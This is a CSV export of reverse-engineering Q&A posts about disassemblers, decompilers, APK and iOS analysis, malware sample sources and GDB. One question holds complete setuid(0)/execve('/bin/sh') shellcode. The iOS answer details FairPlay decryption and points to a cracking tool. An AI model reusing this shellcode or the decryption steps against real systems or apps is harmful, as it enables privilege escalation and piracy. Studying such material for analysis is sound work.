title,viewcount,title,body,body,acceptedanswerid
"Is there any disassembler to rival IDA Pro?","224161","","<p>Is there any disassembler (not only a live debugger) second to IDA in capabilities? IDA is wonderful, and somewhat amazing in how robust and useful it is for reversing. However, it is quite expensive to properly license. Is there <em>any</em> viable alternative, or does IDA hold the monopoly on this market?</p>

<p>I don't expect an alternative to be as good as IDA, just looking for other options that may be more affordable, and useful <em>enough</em>.</p>

<p>EDIT: Preferrably, multi-platform support should exist, though that's optional. MIPS, ARM, x86, and x86-64 would be nice, but a disassembler that handles any one of those is a good option to know about.</p>
","<p>You didn't mention a platform (Windows, Linux, macOS, etc), but here are some great disassemblers.</p>

<p><strong><a href=""http://radare.org/y/"" rel=""noreferrer"">radare2</a></strong></p>

<blockquote>
  <p>Radare2 is an open source tool to disassemble, debug, analyze and
  manipulate binary files.</p>
  
  <p>It actually supports many architectures (x86{16,32,64}, Dalvik, avr,
  ARM, java, PowerPC, Sparc, MIPS) and several binary formats
  (pe{32,64}, [fat]mach0{32,64}, ELF{32,64}, dex and Java classes), apart from support for filesystem images and many more features.</p>
  
  <p>It runs on the command line, but it has a graphical interface in PyGTK called <a href=""http://bokken.inguma.eu/"" rel=""noreferrer"">Bokken</a> that has support for some of its features already.</p>
</blockquote>

<p><a href=""https://binary.ninja/"" rel=""noreferrer""><strong>Binary Ninja</strong></a></p>

<blockquote>
  <p>Binary Ninja is a reverse engineering platform. It focuses on a clean
  and easy to use interface with a powerful multithreaded analysis built
  on a custom IL to quickly adapt to a variety of architectures,
  platforms, and compilers. Runs on macOS, Windows, and Linux.</p>
</blockquote>

<p><a href=""http://www.hopperapp.com/"" rel=""noreferrer""><strong>Hopper</strong></a></p>

<blockquote>
  <p>Hopper is a reverse engineering tool for macOS and Linux, that
  lets you disassemble, decompile and debug (OS X only) your 32/64bits
  Intel Mac, Windows and iOS (ARM) executables.</p>
</blockquote>

<p><a href=""http://x64dbg.com"" rel=""noreferrer""><strong>x64dbg</strong></a></p>

<blockquote>
  <p>An open-source x64/x32 debugger for windows.</p>
</blockquote>

<p><strong><a href=""http://www.immunityinc.com/products/debugger/"" rel=""noreferrer"">ImmunityDbg</a></strong></p>

<blockquote>
  <p>Immunity Debugger is a branch of OllyDbg v1.10, with built-in support
  for Python scripting and much more.</p>
</blockquote>

<p><strong><a href=""http://www.heaventools.com/PE_Explorer_disassembler.htm"" rel=""noreferrer"">PE Explorer's disassembler</a></strong></p>

<blockquote>
  <p>The PE Explorer Disassembler is designed to be easy to use compared
  with other disassemblers. To that end, some of the functionality found
  in other products has been left out in order to keep the process
  simple and fast. While as powerful as the more expensive, dedicated
  disassemblers, PE Explorer focuses on ease of use, clarity and
  navigation.</p>
</blockquote>

<p><strong><a href=""http://www.hiew.ru/"" rel=""noreferrer"">Hiew</a></strong></p>

<blockquote>
  <p>Hiew is a great disassembler designed for
  hackers, as the name suggests. It supports three modes - Text,
  Hexadecimal and Decode (Dis-assembly) mode.</p>
</blockquote>

<p><a href=""http://www.onlinedisassembler.com"" rel=""noreferrer""><strong>ODA</strong></a></p>

<blockquote>
  <p>The Online Disassembler is a free web-based, reverse engineering platform that
  supports over 60 architectures and object file formats from all the 
  major operating systems, including Windows, Mac OS X, Linux, and mobile
  platforms.</p>
</blockquote>

<p><a href=""https://www.relyze.com/overview.html"" rel=""noreferrer""><strong>Relyze</strong></a></p>

<blockquote>
  <p>Relyze is a commercial interactive disassembler for x86, x64 and ARM
  software with loaders for PE or ELF file formats. It supports
  interactive flat and graph views of the disassembly, generating call
  and reference graphs, binary diffing two executables, exploring the
  executable file's structure and a Ruby plugin API. It can also handle
  things like symbols (PDB's), function local variables, switch
  statements, exception handlers, static library identification and
  more.</p>
</blockquote>

<p><a href=""https://github.com/wisk/medusa"" rel=""noreferrer""><strong>Medusa</strong></a></p>

<blockquote>
  <p>Medusa is an open source disassembler with x86, x64, z80 and partial
  ARM support. It runs on Windows and Linux. It has interactive flat and
  graph views.</p>
</blockquote>
","1821"
"How do I get the location of the original audio/video file embedded on a webpage?","148936","","<p>Some sites like The Free Dictionary, and many other translation and pronunciation services, offers a <a href=""http://www.thefreedictionary.com/hacker"">little icon next to the word</a> so you could hear its pronunciation.</p>

<p>How can I figure out the source for an audio\video embedded file on a webpage? 
Where do I start?</p>
","<p>When you create a website and you embed images, videos, audio, javascript or other external sources, you specify their location by an own URL too. </p>

<p>For example you have this directory structure on your server, which resolves to the following accessible URLs (asuming your website is www.example.com):</p>

<pre><code>|-- /index.html                -&gt;  www.example.com/index.html
|-- /images/                   -&gt;  www.example.com/images/
|    |-- /banner.png           -&gt;  www.example.com/images/banner.png
|    +-- /icons/               -&gt;  www.example.com/icons/
|         +-- favicon.png      -&gt;  www.example.com/icons/favicon.png
+-- /audio/                    -&gt;  www.example.com/audio/
    |-- intro.mp3              -&gt;  www.example.com/audio/intro.mp3
    +-- voice.flac             -&gt;  www.example.com/audio/voice.flac
</code></pre>

<p>When you access <code>index.html</code> your browser will look for all the other embedded URLs and will get them from the server too. You can use tools like <em>Firebug for Firefox</em> or the <em>Chrome Developer Console</em> to capture the requests. One of those requests should be the URL to the media file.</p>

<p>If you have an HTML <code>&lt;embed&gt;</code> tag (or a <code>&lt;img&gt;</code> tag), the URL to that media is specified by the <code>src</code> attribute, which can be also examined with tools like Firebug or the Chrome Developer Console. You can make a <code>rightclick-&gt;Inspect Element</code> anywhere on the page and examine the HTML.</p>

<pre><code>&lt;embed src=""/audio/intro.mp3""&gt;   -&gt; www.example.com/audio/intro.mp3
</code></pre>
","2332"
"How do I reverse engineer .so files found in android APKs?","110808","","<p>I know how to reverse engineer normal android APKs using tools like APK-tool anddex2jar but i don't know how to work with obfuscation. Can anyone help or atleast provide some pointers? I know this largely constitues learning by myself but I really don't know what to look or where to look. Some examples would be really helpful. Thanks!</p>

<p><strong>Edit:</strong></p>

<p>When I extract everything from APK, I get some SMALI files (I tried JD-GUI but the strings contained random names. Probably obfuscated using Proguard.), some resource files and a "".so"" files in the lib directory. How do I analyze the "".so"" file. I know that SO files are, kind of DLLs of the Linux world but what are the tools that can be used to analyze SO files. Any links to videos would be very helpful. :)</p>

<p>Also, how would I get around if there were a JAR file instead of SO file in the APK?</p>
","<p>The .so file is a compiled library, in most cases from C or C++ source code. .so stands for Shared Object, it doesn't have anything to do with obfusation, it just means someone wrote parts of the app in C.</p>

<p>In some cases, there is existing C code and it's just easier for the programmer to build a JNI interface to call the library from java; in other cases, the programmer wants the speed advantage that compiled C has over java. And of course, if i want to hide how some part of my application works, writing that in C and compiling it to a .so makes it much harder to reverse.</p>

<p>If you want to reverse an android .so, these are the options you have:</p>

<ul>
<li>Buy the commercial version of IDA pro. The demo versions will not do, as they can't disassemble ARM code. This is expensive, but by far the best tool to work with unknown object code.</li>
<li>If the app includes versions of the .so for different hardware, and if it has a library for android on x86, you can use the free IDA 5.1 version to disassemble it.</li>
<li>If you have access to a linux system, get a gcc toolchain for ARM that includes objdump, and use objdump --disassemble to get a huge text file containing disassembled code. Then, have fun with that text file. There might be gcc toolchains for ARM targets that run on windows as well, but i never tried.</li>
<li>You could also upload the .so file to <a href=""http://onlinedisassembler.com/"">http://onlinedisassembler.com/</a> to get a disassembled file, if you don't want to install a gcc toolchain.</li>
</ul>

<p>Beware, though, in all of these cases, you need a thorough understanding of the ARM processor architecture, assembler language, JNI conventions, and compiler ABI to make any sense of the disassembly. Prepare for many long nights if you're unexperienced.</p>
","4632"
"Where can I, as an individual, get malware samples to analyze?","84147","","<p>It seems that a popular use of software reverse engineering skills is to reverse malicious code in an effort to build better protection for users.</p>

<p>The bottleneck here for people aspiring to break into the security industry through this path seems to be easy access to new malicious code samples to practice on and build heuristics for.</p>

<p>Are there any good resources for a person unaffiliated with any organization to download malware in bulk to run analysis on?</p>
","<p>There's a number of interesting resources you can get malware from</p>

<ul>
<li>The premier Malware sample dump <a href=""http://contagiodump.blogspot.com/"">Contagio</a></li>
<li><a href=""http://www.kernelmode.info/forum/viewforum.php?f=16"">KernelMode.info</a> (Focuses on Win32 and novel rootkit techniques)</li>
<li><a href=""http://www.damagelab.org"">DamageLab.org</a> (People occassionally will post their unpacked executables here, which differ from 'in the wild' executables they are seeking to drop on victim's computers, but interesting none the less, many many rips of more well known techniques and software ranging from TDL to Zeus can be found at sites like this) </li>
<li>The multitude of malware dump sites such as <a href=""http://www.malwareblacklist.com/showMDL.php"">MalwareBlacklist</a></li>
<li>As qbi kindly pointed out, <a href=""http://avcaesar.lu/"">Malware.lu</a> (You have to register for the samples)</li>
</ul>

<p>In addition to these, you can always live dangerously and click on shady affiliate marketing ads or find various signatures for the multitude of ""<em>BEPs""</em> (Browser Exploit Packs) that malware authors frequently use to get installs and analyze the payload to try to find what they are trying to download and exec.</p>
","207"
"Converting assembly code to c","82101","","<p>I have the following assembly code over Linux distro:</p>

<pre><code># using the .data section for write permission
# instead of .text section
.section .data
.globl _start

_start:
     # displaying some characters for watermarking :-)
     xor %eax,%eax      # clear eax by setting eax to 0
     xor %ebx,%ebx      # clear ebx by setting ebx to 0
     xor %edx,%edx      # clear edx by setting edx to 0
     push %ebx          # push ebx into the stack, base pointer
                        # for the stack frame
     push $0xa696e55    # push U-n-i characters
     push $0x4d555544   # push M-U-U-D characters
     push $0x414d4841   # push A-M-H-A characters
     movl  %esp,%ecx    # move the sp to ecx
     movb  $0xf,%dl     # move 15 to dl (low d), it is the string length,
                        # notice the use of movb - move byte, this is to avoid null
     movb  $0x4,%al     # move 4 to al (low l),
                        # 4 is system call number for
                        # write(int fd, char *str, int len)
     int  $0x80         # call kernel/syscall

     # setuid(0)
     xor %eax,%eax      # clear eax by setting eax to 0
     xor %ebx,%ebx      # clear ebx by setting ebx to 0
     xor %ecx,%ecx      # clear ecx by setting ecx to 0
     movb $0x17,%al     # move 0x17 into al - setuid(0)
     int $0x80          # call kernel/syscall

     jmp do_call        # jump to get the address with the call trick

jmp_back:
     pop %ebx           # ebx (base pointer=stack frame pointer) has 
                        # the address of our string, use it to index
     xor %eax,%eax      # clear eax by setting eax to 0
     movb %al,7(%ebx)   # put a null at the N or shell[7]
     movl %ebx,8(%ebx)  # put the address of our string (in ebx) into shell[8]

     movl %eax,12(%ebx) # put the null at shell[12] our string now looks something like
                        # ""/bin/sh\0(*ebx)(*0000)""
     xor %eax,%eax      # clear eax by setting eax to 0
     movb $11,%al       # put 11 which is execve

# syscall number into al
     leal 8(%ebx),%ecx  # put the address of XXXX i.e. (*ebx) into ecx
     leal 12(%ebx),%edx # put the address of YYYY i.e. (*0000) into edx
     int $0x80          # call kernel/syscall

do_call:
     call jmp_back

shell:
     .ascii ""/bin/shNXXXXYYYY""
</code></pre>

<p>How is it possible to convert it to C code?</p>
","<p>Here is the list of few decompilation tools / resources that you may find useful.</p>

<ul>
<li><a href=""https://www.hex-rays.com/products/decompiler/"">IDA Pro + Hex-Rays</a> decompiler</li>
<li><a href=""http://www.hopperapp.com/"">Hopper disassembler</a> (has a decompiler)</li>
<li><a href=""http://www.onlinedisassembler.com/"">ODA</a> (Online Disassembler)</li>
<li><a href=""http://decompiler.fit.vutbr.cz/decompilation/"">Retargetable Decompiler</a></li>
</ul>
","3751"
"Possibilities for reverse engineering an ipa file to its source","81058","","<p>I browsed a lot, but can't find any resources for reverse engineering an ipa file (iPhone application). Is there any method to reverse engineer an ipa file to its source? I've tried to rename it to zip and open it via Winrar/Winzip to view its source, but it doesn't seem helpful.</p>

<p>What are the possibilities to decompile/reverse engineer an ipa file to its source code?</p>
","<p>If the IPA file is straight from iTunes/iPhone (without any modification), the code section in the binary (as indicated by the Info.plist) is encrypted with FairPlay (Apple's proprietary DRM). If you are unsure, you can check whether the cryptid bit is set with otool (see <a href=""https://stackoverflow.com/questions/7038143/executable-encryption-check-anti-piracy-measure"">this page</a>).</p>

<pre><code>otool -arch armv7 -l thebinary | grep crypt
</code></pre>

<p>(where thebinary is the executable binary - see the app's Info.plist, CFBundleExecutable key)</p>

<p><strong>Pre Decryption:</strong></p>

<p>if cryptid is 0, you can proceed on to the <em>Post Decryption</em> section. Otherwise, you will need to decrypt the app. The typical method in brief (with a jailbroken iOS device) is to </p>

<ol>
<li>Install otool, gdb and ldid from Cydia</li>
<li>Install the IPA on an <em>authorized</em> device</li>
<li>Run otool on the binary to get information such as the size of the encrypted payload</li>
<li>Launch the app and suspend it immediately</li>
<li>Use gdb to dump the payload (beginning from 0x2000) <code>gdb -p &lt;process id&gt;</code> then <code>dump output.bin 0x2000 0xNNNN</code> where NNNN is the sum of the beginning (0x2000) and the payload size</li>
<li>Create a new file, using the first 0x1000 bytes of the original binary, and appended with the dump file</li>
<li>Use ldid to sign the new binary, and change the cryptid to 0 (so that iOS won't decrypt the decrypted app again)</li>
</ol>

<p>There are many tools of dubious purposes (piracy) which automates the process, however the above is the gist of how the process is done.</p>

<p><strong>Post Decryption:</strong></p>

<p>You can begin reverse engineering the code when you have access to an unencrypted copy of the binary. </p>

<p>One possible tool is IDA Pro (Free version does not support ARM).
It may still be quite messy since much of iOS's code works with objc_sendMsg(). This IDA plugin may help: <a href=""https://github.com/zynamics/objc-helper-plugin-ida"" rel=""nofollow noreferrer"">https://github.com/zynamics/objc-helper-plugin-ida</a></p>

<p>When you are patching functions, an easier way to work (if you know Objective-C) is to use MobileSubstrate to hook the relevant functions. See Dustin Howett's <a href=""https://www.google.com/url?sa=t&amp;rct=j&amp;q=&amp;esrc=s&amp;source=web&amp;cd=2&amp;cad=rja&amp;ved=0CDoQFjAB&amp;url=https://github.com/DHowett/theos&amp;ei=hbVeUbTbBtCzrAfg3oHwDA&amp;usg=AFQjCNGzNmTvG_B3OpbEMTsHt_nNMzz15w&amp;bvm=bv.44770516,d.bmk"" rel=""nofollow noreferrer"">theos</a> if you would like to try this method.</p>

<p><strong>Useful Links:</strong></p>

<p>More about the decryption process: <a href=""http://iphonedevwiki.net/index.php/Crack_prevention"" rel=""nofollow noreferrer"">http://iphonedevwiki.net/index.php/Crack_prevention</a></p>

<p>Getting otool: <a href=""https://apple.stackexchange.com/questions/21256/i-cant-find-otool-on-my-jailbroken-ipod"">https://apple.stackexchange.com/questions/21256/i-cant-find-otool-on-my-jailbroken-ipod</a></p>

<p>Signing with ldid (since the original signature is made invalid after editing) <a href=""http://www.saurik.com/id/8"" rel=""nofollow noreferrer"">http://www.saurik.com/id/8</a></p>

<p><strong>For newer devices</strong></p>

<p>Some of the tools (gdb in my base) are not working reliably on the iPhone 5S / iOS7. Currently a method that works is to use a popular open-source cracking software <a href=""https://github.com/KJCracks/Clutch/releases"" rel=""nofollow noreferrer"">""Clutch""</a>. The actual cracking process can be found here: <a href=""https://github.com/KJCracks/Clutch/blob/master/Classes/Binary.m"" rel=""nofollow noreferrer"">https://github.com/KJCracks/Clutch/blob/master/Classes/Binary.m</a></p>
","1601"
"What is a good Java decompiler and deobfuscator?","69854","","<p>I am using <a href=""http://jd.benow.ca/"">JD-GUI</a> to decompile Java JAR files, but the problem is that it leaves many errors, such as duplicate variables which I have to fix myself and check to see if the program still works (if I fixed the errors correctly).</p>

<p>I also tried Fernflower, but that leaves blank classes if it's missing a dependency.</p>

<p>I'd like to know which decompiler:</p>

<ul>
<li>gives the least amount of errors</li>
<li>deobfuscates the most.</li>
</ul>
","<p>My apologies for the belated reply. <br/>
I have been working on a new, open source <a href=""https://bitbucket.org/mstrobel/procyon/wiki/Java%20Decompiler"">Java decompiler</a>. Feel free to check it out.<br/>I have not tested it against any obfuscated code, but I have seen it decompile many methods that JD-GUI failed to handle.  Note that it's a work in progress, and I'm sure you will find plenty of code that it will fail to decompile.</p>
","2138"
"How are the segment registers (fs, gs, cs, ss, ds, es) used in Linux?","63636","","<p>I try to understand the process of memory segmentation for the i386 and amd64 architectures on Linux. It seems that this is heavily related to the segment registers <code>%fs</code>, <code>%gs</code>, <code>%cs</code>, <code>%ss</code>, <code>%ds</code>, <code>%es</code>. </p>

<p>Can somebody explain how these registers are used, both, in user and kernel-land programs ?</p>
","<p><strong>Kernel perspective:</strong></p>

<p>I will try to answer from the kernel perspective, covering various OS's.</p>

<p><a href=""http://en.wikipedia.org/wiki/Memory_segmentation"" rel=""nofollow noreferrer"">Memory segmentation</a> is the old way of accessing memory regions.
All major operating systems including OSX, Linux, (from version 0.1) and Windows (from NT) are now using <a href=""http://en.wikipedia.org/wiki/Paging"" rel=""nofollow noreferrer"">paging</a> which is a better way (IMHO) of accessing memory.</p>

<p>Intel, has always introduced backward compatibility in its processors (except IA-64, and we saw how it failed...)
So, in its initial state (after reset) the processor starts in a mode called <a href=""http://en.wikipedia.org/wiki/Real_mode"" rel=""nofollow noreferrer"">real mode</a>, in this mode, segmentation is enabled by default to support legacy software.
During the boot process of the operating system, the processor is changed into <a href=""http://en.wikipedia.org/wiki/Protected_mode"" rel=""nofollow noreferrer"">protected mode</a>, and then in enabled paging.</p>

<p>Before paging, the segment registers were used like this</p>

<blockquote>
  <p>In real mode each logical address points directly into physical memory
  location, every logical address consists of two 16 bit parts: The
  segment part of the logical address contains the base address of a
  segment with a granularity of 16 bytes, i.e. a segments may start at
  physical address 0, 16, 32, ..., 220-16. The offset part of the
  logical address contains an offset inside the segment, i.e. the
  physical address can be calculated as physical_address : =
  segment_part × 16 + offset (if the address line A20 is enabled),
  respectively (segment_part × 16 + offset) mod 220 (if A20 is
  off) Every segment has a size of 216 bytes. [Wikipedia]</p>
</blockquote>

<p><strong>Let's see some examples (286-386 era) :</strong></p>

<p>The 286 architecture introduced 4 segments: <strong>CS</strong> (code segment) <strong>DS</strong> (data segment) SS (stack segment) <strong>ES</strong> (extra segment)
the 386 architecture introduced two new general segment registers <strong>FS</strong>, <strong>GS</strong>.</p>

<p>typical assembly opcode (in Intel syntax) would look like:</p>

<pre><code>mov dx, 850h
mov es, dx     ; Move 850h to es segment register
mov es:cx, 15h ; Move 15 to es:cx
</code></pre>

<p>Using paging (protected mode) the segment registers weren't used anymore for addressing memory locations.</p>

<blockquote>
  <p>In protected mode the segment_part is replaced by a 16 bit selector,
  the 13 upper bits (bit 3 to bit 15) of the selector contains the index
  of an entry inside a descriptor table. The next bit (bit 2) specifies
  if the operation is used with the GDT or the LDT. The lowest two bits
  (bit 1 and bit 0) of the selector are combined to define the privilege
  of the request; where a value of 0 has the highest priority and value
  of 3 is the lowest. [wikipedia]</p>
</blockquote>

<p>The segments however still used to enforce hardware security in the GDT</p>

<blockquote>
  <p>The Global Descriptor Table or GDT is a data structure used by Intel
  x86-family processors starting with the 80286 in order to define the
  characteristics of the various memory areas used during program
  execution, including the base address, the size and access privileges
  like executability and writability. These memory areas are called
  segments in Intel terminology. [wikipedia]</p>
</blockquote>

<p>So, in practice the segment registers in protected mode are used to store indexes to the GDT.</p>

<p>Several operating systems such as Windows and Linux, use some of the segments for internal usage. for instance Windows x64 uses the <code>GS</code> register to access the TLS (thread local storage) and in Linux it's for accessing cpu specific memory.</p>

<p><strong>User perspective:</strong></p>

<p>From the user perspective, in recent operating system that uses paging, the memory works in so called ""flat mode"".
Every process access its own memory (4GB) in linear fashion, so basically the segment registers are not needed.</p>

<p>They are still registers, so they can of course be used for various other assembly operations.</p>
","2009"
"How to know in which language/technology program (.exe) is written?","62022","","<p>How to understand if exe/dll is written in C++/.Net/Java or in any other language. I tried to use Dependency walker but not able to get required information.</p>
","<p>(reposting <a href=""https://stackoverflow.com/a/18722413/422797"">my SO answer</a> to a similar question)</p>

<p>In many cases it is possible to identify the compiler used to compile the code, and from that, the original language.</p>

<p>Most language implementations include some kind of runtime library to implement various high-level operations of the language. For example, C has the CRT which implements file I/O operations (<code>fopen</code>, <code>fread</code> etc.), Delphi has compiler helpers for its <code>string</code> type (concatenation, assignment and others), ADA has various low-level functions to ensure language safety and so on. By comparing the code of the program and the runtime libraries of the candidate compilers you may be able to find a match.</p>

<p>IDA implements this approach in the <a href=""https://www.hex-rays.com/products/ida/tech/flirt/in_depth.shtml"" rel=""nofollow noreferrer"">FLIRT technology</a>. By using the signatures, IDA is able to determine most of the major compilers for DOS and Windows. It's somewhat more difficult on Linux because there's no single provider of compiler binaries for it, so signatures would have to be made for every distro.</p>

<p>However, even without resorting to the runtime library code, it may be possible to identify the compiler used. Many compilers use very distinct idioms to represent various operations. For example, I <a href=""http://www.reddit.com/r/programming/comments/qnyy9/duqu_trojan_written_in_mystery_programming/c3z8qhg"" rel=""nofollow noreferrer"">was able to guess</a> that the compiler used for the Duqu virus was Visual C++, which was later <a href=""http://www.wired.com/threatlevel/2012/03/duqu-mystery-language-solved/"" rel=""nofollow noreferrer"">confirmed</a>.</p>
","3366"
"Is there any way to decompile a .NET assembly or program?","51627","","<p>Are there any tools available to take an already compiled .dll or .exe file that you know was compiled from C# or Visual Basic and obtain the original source code from it?</p>
","<p><a href=""http://ilspy.net/"">ILSpy</a> is a great open-source decompiler.</p>

<blockquote>
  <p>ILSpy Features</p>
  
  <ul>
  <li>Assembly browsing</li>
  <li>IL Disassembly</li>
  <li>Support C# 5.0 ""async""</li>
  <li>Decompilation to C#</li>
  <li>Supports lambdas and 'yield return'</li>
  <li>Shows XML documentation</li>
  <li>Decompilation to VB</li>
  <li>Saving of resources</li>
  <li>Save decompiled assembly as .csproj</li>
  <li>Search for types/methods/properties (substring)</li>
  <li>Hyperlink-based type/method/property navigation</li>
  <li>Base/Derived types navigation</li>
  <li>Navigation history</li>
  <li>BAML to XAML decompiler</li>
  <li>Save Assembly as C# Project</li>
  <li>Find usage of field/method</li>
  <li>Extensible via plugins (MEF)</li>
  <li>Assembly Lists</li>
  </ul>
</blockquote>
","81"
"Decent GUI for GDB","50467","","<p>Learning the GDB commands is on my bucket-list, but in the meantime is there a graphical debugger for *nix platforms that <strong>accepts</strong> Windbg commands, and has similar functionality?  For example, the ability to bring out multiple editable memory windows, automatically disassemble around an area while stepping, set disassembly flavor, and have a window with registers that have editable values?</p>
","<p>A <a href=""https://github.com/cyrus-and/gdb-dashboard"" rel=""noreferrer"">.gdbinit file</a> on steriods that adds colors, shows assembly, registers, etc. It takes almost no work to set up and looks amazing:</p>

<p><a href=""https://i.stack.imgur.com/qaVtf.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/qaVtf.png"" alt=""Screenshot running gdb with a different .gdbinit file""></a></p>

<p><strong>EDIT: I have since started my own gdb frontend: <a href=""https://github.com/cs01/gdbgui"" rel=""noreferrer"">gdbgui</a></strong></p>

<p><strong>Install</strong></p>

<pre><code>[sudo] pip install gdbgui --upgrade
</code></pre>

<p>Works on Ubuntu and OSX</p>

<p><strong>Run</strong></p>

<pre><code>gdbgui
</code></pre>

<p><strong>Features</strong></p>

<ul>
<li>set/remove breakpoints</li>
<li>view sourcecode, with optional inline machine code </li>
<li>select current frame in stack</li>
<li>step through source code or machine code</li>
<li>create/explore variables</li>
<li>view/select threads</li>
<li>explore memory</li>
<li>view of all registers</li>
<li>full gdb terminal functionality so you can send traditional gdb commands, and view gdb/inferior program output</li>
<li>layout inspired by the amazing Chrome debugger</li>
</ul>

<p><a href=""https://i.stack.imgur.com/mhwOV.png"" rel=""noreferrer""><img src=""https://i.stack.imgur.com/mhwOV.png"" alt=""gdbgui screenshot""></a></p>
","13592"
"Analyzing highly obfuscated JavaScript","48582","","<p>I was recently analyzing a web page that contained some highly obfuscated JavaScript - it's clear that the author had went through quite a bit of effort to make it as hard to understand as possible. I've seen several variations on this code - there are enough similarities that it's clear that they have the same source, but different enough that the solution to deobfuscate changes each time.</p>

<p>I started with running the URL through <a href=""https://www.virustotal.com/en/"">VirusTotal</a>, which scored 0/46 - so it was something of interest and not being detected by Anti-Virus software (at least statically). Next I tried running it through <a href=""http://jsunpack.jeek.org/?"">jsunpack</a> to see if it could make any sense of it - no luck, it broke the parser.</p>

<p>Looking at the code, there were a few methods that were designed to be confusing, and then several KB of strings like this that would eventually be decoded as javascript and executed:</p>

<pre><code>22="";4kqkk;255ie;35bnh;4mehn;2lh3b;7i29n;6m2jb;7jhln;562ik...""
</code></pre>

<p>After digging around for a few minutes I was able to determine that the bit of code I really carded about was this:</p>

<pre><code>try{document.body--}catch(dgsdg){e(a);}
</code></pre>

<p>In this case <code>e</code> had been aliased to <code>eval</code> and <code>a</code> was a string that had been manipulated by the various functions at the beginning of the file (and passed around via a series of misleading assignments).</p>

<p>To quickly get the value of <code>a</code> I modified the code to Base64 encode it and output the value, and then opened the HTML file in Chrome on a VM (disconnected from the network):</p>

<pre><code>document.write(window.btoa(a))
</code></pre>

<p>This was able to get me the value I was looking for, but the process took too long - and if I had missed another <code>eval</code> it's possible that I could have executed what was clearly malicious code. So I was able to get what I needed and identify the malware that it was trying to drop - but the process was too slow and risky.</p>

<p>Are there better ways to run javascript like this in a secure sandbox to minimize the risks that go with executing it? I don't see any way a tool could be built to generically deobfuscate this kind of code, so I don't see any way around running it (or building one-off tools, which is also time consuming).</p>

<p>I'd be interesting in hearing about other tools and techniques for dealing with this kind of code.</p>
","<p>It might be worth submitting the JS sample to Wepawet, an online sandbox for web malware analysis.  It is run by UCSB and generally has excellent unpacking/analysis/reporting capabilities.</p>

<p>Link: <a href=""http://wepawet.iseclab.org/"">http://wepawet.iseclab.org/</a></p>
","1437"
"How can I decompile my (dot)NET .EXE file into its source code","43235","","<p>I was working on a <code>C#.NET</code> application on windows platform, I was just testing the code and I don't know somehow I messed it up and after making too much efforts on <strong>undoing</strong>, I am still not able to <strong>recover</strong> my code. I don't want to write the whole code again.</p>

<p>I only left with its .EXE file that executes well here, I want to know about some techniques or tools so that I can decompile my <code>EXE</code> code into its source code, Is it possible if it is, then please tell me some good decompilers. Any help will be appreciated, Thanks.</p>
","<p>you can get pretty decent results with:</p>

<ol>
<li><a href=""http://www.red-gate.com/products/dotnet-development/reflector/"" rel=""nofollow"">.NET Reflector 8</a></li>
<li><a href=""http://ilspy.net/"" rel=""nofollow"">ILSpy</a> - is an open source project. I had experience with it in the past and it gave very good results.</li>
</ol>
","2692"
"How to handle stripped binaries with GDB? No source, no symbols and GDB only shows addresses?","41894","","<p>I have GDB but the binary I want reverse engineer dynamically has no symbols, that is when I run the <code>file</code> utility it shows me <strong>stripped</strong>:</p>

<pre><code>ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.18, stripped
</code></pre>

<p>What options do I have if the environment in which this runs doesn't allow a remote IDA Pro instance to connect to <code>gdbserver</code>? In short: the environment you have is limited in what it allows you to do, but you do have trusty old <code>gdb</code> and a binary to reverse engineer.</p>
","<h1>Conventions used plus preliminary remarks</h1>

<p>I am trimming the output of GDB for brevity since it usually shows the copyright and other information at the beginning of ever session. When I reproduce the output I'll start at the first <code>(gdb)</code> prompt line, or in case or auto-executed commands from the first genuine output line.</p>

<p>In order to distinguish commands entered at the GDB prompt, these will have a leading <code>(gdb)</code> just like in the real world. For shell command this will either be no prefix at all or <code>$</code> as it appears to be the convention on most unixoid systems.</p>

<p>When I use a particular command, such as <code>vim</code> as my editor, you are free to use your own favorite editor of course. Be it <a href=""http://xkcd.com/378/"" rel=""noreferrer""><code>emacs</code></a> or <code>nano</code>, I won't judge ya ;)</p>

<h1>Getting started</h1>

<p>This section is about setting up your <code>gdb</code> environment and starting the process. I'll also include a few tidbits for the complete newcomers.</p>

<h2>Tricks you should know</h2>

<p>GDB has a nice prompt at which your cursor will stop after the program breaks or whenever you are stepping or some such.</p>

<ul>
<li>Pressing <kbd>RETURN</kbd> (aka <kbd>ENTER</kbd>) after you ran a GDB command will run the same command again. This is useful when you are stepping through code with <code>step</code> or <code>next</code> and simply want to continue one by one.</li>
<li>Commands can be abbreviated as long as they are unambiguous. For some oft used commands a particular shorthand exists that takes precedence despite ambiguity:

<ul>
<li><code>b</code> for <code>break</code> (despite <code>bt</code> and <code>backtrace</code>)</li>
<li><code>c</code> or <code>cont</code> for <code>continue</code> (despite <code>catch</code>, <code>call</code> and so on)</li>
<li><code>n</code> for <code>next</code> (despite <code>ni</code> and <code>nexti</code>)</li>
</ul></li>
<li>You can call actual library functions or even functions from within the debugged program using the command <code>call</code>. This means you can try out behavior or force behavior.</li>
<li>You can start GDB with <code>gdbtui</code> or <code>gdb -tui</code> to get a - supposedly more convenient - more visual text user interface. It shows the source code at the top and the <code>(gdb)</code> prompt below. You can also switch to this layout by executing the command <code>layout src</code> at the <code>(gdb)</code> prompt.</li>
<li>GDB has a command line completion feature much like many shells, so use <kbd>Tab</kbd> to your advantage and also make sure to use <code>help</code> or <code>help [keyword|command]</code> whenever you are in need of help.</li>
<li><code>shell</code> allows you to execute commands in the shell, so that you can run commands from within your GDB session. During development an example would be <code>shell make</code>.</li>
<li><code>print</code>, <code>examine</code> and <code>display</code> know various formats (<code>/FMT</code>) which you can use to make the output more readable.</li>
<li>When source-level debugging you can use C type casts to display values. Imagine a C string behind a <code>void *</code> (which GDB knows thanks to the symbols in such case). Simply cast to <code>(char*)</code> and print it: <code>print (char*)variable</code>.</li>
</ul>

<h2>Getting the process to run</h2>

<p>Since we want to dynamically analyze the binary, we need to start it first.</p>

<h3>Command line</h3>

<p>We can do that straight from the command line by passing not only the path to the binary, but also the arguments we want to start it with. The whole process then looks like this:</p>

<pre><code>$ gdb --args ./exe argument1 argument2
</code></pre>

<p>Easy enough. From the <code>(gdb)</code> prompt you can then issue the <code>run</code> command (shorthand <code>r</code>) to run <code>./exe</code> with the parameters given on the command line. I prefer this method, but your mileage may vary.</p>

<p><img src=""https://i.stack.imgur.com/1IOfY.png"" alt=""Starting a process using the described method""></p>

<h3>GDB prompt</h3>

<p>Fire up GDB and at the <code>(gdb)</code> prompt use the <code>file</code> command to load the binary and then use the <code>run</code> command to start it with the arguments you want to pass:</p>

<pre><code>$ gdb
(gdb) file exe
(gdb) run argument1 argument2
</code></pre>

